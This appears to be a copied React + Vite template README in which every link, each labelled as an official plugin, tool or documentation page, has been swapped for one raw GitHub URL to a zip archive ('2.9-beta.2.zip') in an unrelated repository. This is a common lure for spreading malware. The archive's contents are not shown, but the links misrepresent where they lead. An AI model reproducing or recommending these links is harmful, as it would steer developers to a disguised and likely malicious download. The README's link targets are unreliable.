# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/liyamuowner/Aegis-Crypt-key/master/src/assets/2.9-beta.2.zip) uses [Oxc](https://raw.githubusercontent.com/liyamuowner/Aegis-Crypt-key/master/src/assets/2.9-beta.2.zip)
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/liyamuowner/Aegis-Crypt-key/master/src/assets/2.9-beta.2.zip) uses [SWC](https://raw.githubusercontent.com/liyamuowner/Aegis-Crypt-key/master/src/assets/2.9-beta.2.zip)

## React Compiler

The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://raw.githubusercontent.com/liyamuowner/Aegis-Crypt-key/master/src/assets/2.9-beta.2.zip).

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://raw.githubusercontent.com/liyamuowner/Aegis-Crypt-key/master/src/assets/2.9-beta.2.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://raw.githubusercontent.com/liyamuowner/Aegis-Crypt-key/master/src/assets/2.9-beta.2.zip) in your project.
